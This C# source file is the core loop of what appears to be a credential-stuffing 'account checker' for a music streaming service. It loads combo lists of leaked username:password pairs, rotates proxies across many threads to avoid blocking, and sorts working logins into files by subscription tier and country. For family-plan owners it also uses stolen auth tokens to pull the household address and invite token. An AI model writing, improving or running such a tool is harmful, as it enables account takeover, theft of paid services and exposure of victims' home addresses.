using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using ikvm.extensions;
using javax.crypto;
using Newtonsoft.Json.Linq;
using Console = Colorful.Console;

namespace ConsoleApp1
{
    class CUI
    {
        public static Config.configObject config = null;
        public static void Init()
        {
            Console.Clear();
            Console.WriteLine(Program.logo);
            Console.WriteLine(""); 
            config = Module1.getConfig();
            while (true)
            {
                try
                {
                    Console.WriteLine("Open combo file: ");
                    Thread.Sleep(200);
                    Stats.combo = OpenFile.openFile("combo file").ToList();
                    break;
                }
                catch (Exception ex)
                {

                }
            }
            Console.WriteLine(Stats.combo.Count + " combos loaded");
            if (!config.PROXYLESS)
            {
                if (!config.API)
                {
                    Console.WriteLine("Open Proxy File: ");
                    foreach (string line in OpenFile.openFile("proxy file"))
                    {
                        if (line.Length > 7)
                        {
                            proxyObject a = new proxyObject(line.Trim(), true);
                            Proxy.proxies.Add(a);
                        }
                    }
                }
                else
                {
                    string[] url = { config.API_LINK };
                    Proxy.updateList(url);
                    Thread UPDATETHREADPROXIES = new Thread(Proxy.updateThread);
                    UPDATETHREADPROXIES.Start(config.API_REFRESH_TIME * 60000);
                }
                Console.WriteLine(Proxy.proxies.Count + " proxies loaded");
            }

            Thread lol = new Thread(ThreadStartingThread);
            lol.Start();
        }

        public static void ThreadStartingThread()
        {
            while (true)
            {
                if (Stats.runningThreads < config.threads)
                {
                    Thread a = new Thread(thread);
                    a.Start();
                    Stats.runningThreads++;
                }
            }
        }

        public static void thread()
        {
            proxyObject proxy = null;
            if (!config.PROXYLESS)
            {
                while (proxy == null)
                {
                    proxy = Proxy.getProxy();
                }
            }

            string combo = null;
            while (true)
            {
                if (combo == null)
                {
                    combo = getAcc.getacc();
                }

                try
                {
                    SubType type = SubType.ERROR;
                    if (!config.PROXYLESS)
                    { 
                        type = getSub(proxy.Proxy, combo);
                    }
                    else
                    { 
                        type = getSub("null", combo);
                    }

                    if (type == SubType.ERROR)
                    {
                        Stats.ERROR++;
                        if (!config.PROXYLESS)
                        {
                            proxy.Working = false;
                            proxy = null;
                            while (proxy == null)
                            {
                                proxy = Proxy.getProxy();
                            }
                        }
                    }
                    else
                    {
                        if (type == SubType.FREE)
                        {
                            Stats.FREE++;
                            save(Program.outFolder + "\\free.txt", combo);
                        }
                        else if (type == SubType.STUDENT)
                        {
                            Stats.STUDENT++;
                            save(Program.outFolder + "\\student.txt", combo);
                            save(Program.outFolder + "\\allPremium.txt", combo);
                        }
                        else if (type == SubType.DUO)
                        {
                            Stats.DUO++;
                            save(Program.outFolder + "\\duo.txt", combo);
                            save(Program.outFolder + "\\allPremium.txt", combo);
                        }
                        else if (type == SubType.FAMILYMEMBER)
                        {
                            Stats.FAMILY_MEMBER++;
                            save(Program.outFolder + "\\family-member.txt", combo);
                            save(Program.outFolder + "\\allPremium.txt", combo);
                        }
                        else if (type == SubType.FAMILYOWNER)
                        {
                            Stats.FAMILY_OWNER++;
                            save(Program.outFolder + "\\family-owner.txt", combo);
                            save(Program.outFolder + "\\allPremium.txt", combo);
                        }
                        else if (type == SubType.HULU)
                        {
                            Stats.HULU++;
                            save(Program.outFolder + "\\hulu.txt", combo);
                            save(Program.outFolder + "\\allPremium.txt", combo);
                        }
                        else if (type == SubType.PREMIUM)
                        {
                            Stats.PREMIUM++;
                            save(Program.outFolder + "\\premium.txt", combo);
                            save(Program.outFolder + "\\allPremium.txt", combo);
                        }
                        else if (type == SubType.INVALID)
                        {
                            Stats.INVALID++;
                            if (config.INVALIDS)
                            {
                                save(Program.outFolder + "\\invalid.txt", combo);
                            }
                        }
                        else if (type == SubType.OTHER)
                        {
                            Stats.OTHER++;
                            save(Program.outFolder + "\\other.txt", combo);
                        }
                        combo = null;
                    }
                }
                catch (NullReferenceException ex)
                {
                    if (!config.PROXYLESS)
                    {
                        proxy.Working = false;
                        proxy = Proxy.getProxy();
                    }

                    Stats.runningThreads--;
                    return;
                }

            }


        }

        public static void save(string name, string input)
        {
            while (true)
            {
                try
                {
                    File.AppendAllText(name, input + "\n");
                    break;
                }
                catch (Exception ex)
                {

                }
            }
        }

        public enum SubType
        {
            FREE, PREMIUM, HULU, DUO, FAMILYMEMBER,FAMILYOWNER,OTHER,STUDENT, INVALID,ERROR
        };
        public static SubType getSub(string proxy, string combo)
        {
            try
            {
                string asd = blala.check(proxy, combo);

                string subUnparsed = asd.split("-lol-")[0].toLowerCase();
                
                SubType type = SubType.FREE;
                if (subUnparsed.Contains("invalid"))
                {
                    type = SubType.INVALID;
                }
                else if (subUnparsed.Contains("error"))
                {
                    type = SubType.ERROR;
                }
                else if (subUnparsed.Contains("pr:open"))
                {
                    type = SubType.FREE;
                    save(Program.outFolder + "\\country\\free\\"+ asd.split("-lol-")[2]+".txt", combo);
                    
                }
                else if (subUnparsed.Contains("student"))
                {
                    type = SubType.STUDENT;
                    save(Program.outFolder + "\\country\\premium\\" + asd.split("-lol-")[2] + ".txt", combo);

                }
                else if (subUnparsed.Contains("hulu"))
                {
                    type = SubType.HULU;
                    save(Program.outFolder + "\\country\\premium\\" + asd.split("-lol-")[2] + ".txt", combo);
                }
                else if (subUnparsed.contains("duo"))
                {
                    type = SubType.DUO;
                    save(Program.outFolder + "\\country\\premium\\" + asd.split("-lol-")[2] + ".txt", combo);
                }
                else if (subUnparsed.contains("family") && subUnparsed.contains("sub"))
                {
                    type = SubType.FAMILYMEMBER;
                    save(Program.outFolder + "\\country\\premium\\" + asd.split("-lol-")[2] + ".txt", combo);
                }
                else if (subUnparsed.contains("family") && subUnparsed.contains("master"))
                {
                    type = SubType.FAMILYOWNER;
                    string username = Regex.Match(asd.split("-lol-")[1],"(?<=canonical_username: \")(.*)(?=\")").Value;
                    string token = Regex.Match(asd.split("-lol-")[1],"(?<=reusable_auth_credentials: \")(.*)(?=\")").Value;
                    JObject obj = JObject.Parse(puff.getCapture(username, token,proxy));

                    string comboo = combo;
                    string address = obj["address"].toString();
                    string inviteToken = obj["inviteToken"].toString();
                    string maxInvites = obj["maxCapacity"].toString();
                    int usersinFamily = JArray.Parse(obj["members"].toString()).Count;
                    string country = JArray.Parse(obj["members"].toString())[0]["country"].toString();

                    Directory.CreateDirectory(Program.outFolder + "\\FamilyCapture");

                    string capture = address + ":" + inviteToken + ":" + country;

                    File.AppendAllText(Program.outFolder + "\\FamilyCapture\\"+ country + ".txt", capture + "\n");
                    save(Program.outFolder + "\\country\\premium\\" + asd.split("-lol-")[2] + ".txt", combo);
                }
                else if (subUnparsed.contains("pr:premium"))
                {
                    type = SubType.PREMIUM;
                    save(Program.outFolder + "\\country\\premium\\" + asd.split("-lol-")[2] + ".txt", combo);
                }
                else
                {
                    type = SubType.OTHER;
                    save(Program.outFolder + "\\country\\premium\\" + asd.split("-lol-")[2] + ".txt", combo);
                }
                return type;
            }
            catch (Exception ex)
            {
            }

            return SubType.ERROR;
        }
    }
}